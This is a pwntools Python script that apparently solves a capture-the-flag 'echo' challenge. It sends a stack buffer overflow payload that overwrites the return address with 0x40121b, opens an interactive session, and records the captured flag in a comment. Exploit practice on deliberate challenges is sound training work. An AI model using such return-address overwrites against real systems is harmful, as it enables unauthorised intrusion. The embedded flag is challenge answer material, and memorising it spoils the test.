from pwn import *

# context.arch = 'amd64'
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./echo', '''
#     b *0x4012e8
#     continue
# ''')

p = remote('challenge.ctf.games', 31413)

p.recvuntil(b"Give me some text and I'll echo it back to you: \n")
p.sendline(b'A'*0x88+p64(0x40121b))

p.interactive()

# flag{4f4293237e37d06d733772a087299f17}